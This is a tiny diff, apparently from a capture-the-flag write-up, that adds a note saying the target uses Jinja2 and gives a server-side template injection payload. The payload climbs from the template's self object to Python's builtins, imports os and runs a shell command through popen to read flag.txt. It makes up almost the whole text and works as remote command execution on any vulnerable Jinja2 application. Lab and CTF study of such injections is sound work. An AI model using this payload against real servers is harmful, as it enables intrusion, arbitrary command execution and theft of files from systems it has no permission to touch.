@@ -1,0 +1,3 @@
+This is Jinja2 so I use this payload to exploit 
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
